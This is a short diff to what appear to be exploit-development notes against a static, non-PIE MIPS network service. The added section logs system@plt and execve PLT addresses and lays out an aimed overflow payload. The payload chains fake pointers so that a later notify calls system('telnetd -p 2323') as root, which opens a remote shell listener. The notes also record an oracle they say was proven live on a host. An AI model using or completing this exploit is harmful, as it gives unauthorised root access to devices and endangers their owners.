@@ -625,3 +625,21 @@ offset 23,657). **Open item:** the fake pointer needs a real address —
 either a heap-address leak or the deterministic-base guess sweep (wrong
 guess = the familiar 14–36 s hang; right guess = clean/benign — a usable
 oracle per candidate).
+
+### system@plt located (S2, STATIC, non-PIE) — the final aim value (2026-11-04)
+
+.rel.plt[499] system: GOT 0x6F67D4, **PLT stub 0x6DCE50** (raw: lui/lw/jr via GOT).
+.rel.plt[430] execve: GOT 0x6F66C0, **PLT stub 0x6DCA00**.
+Calling the stub = calling the libc function regardless of lazy/GOT state.
+
+AIMED-PAYLOAD LAYOUT (all inside the 24KB overflow, once the session addr S is known):
+  fake_ptr F = S+6380+k
+  [F+6404] = A = S+6380+j1
+  [A+8]    = B = S+6380+j2   (j2 = command-string offset)
+  [B+28]   = 0x6DCE50        (system@plt — static)
+  string at B: "telnetd -p 2323\0" (≤27 bytes, NUL before B+28)
+  → system("telnetd -p 2323") as root on the next notify.
+
+Oracle differential PROVEN on .135 today: two-stage fire with fake_ptr=0x55000000
+(unmapped) → crash @54.8s; fake_ptr=0x66BC40 (mapped) → clean. The strcpy FIRES
+and the notify dereferences attacker-controlled pointers.
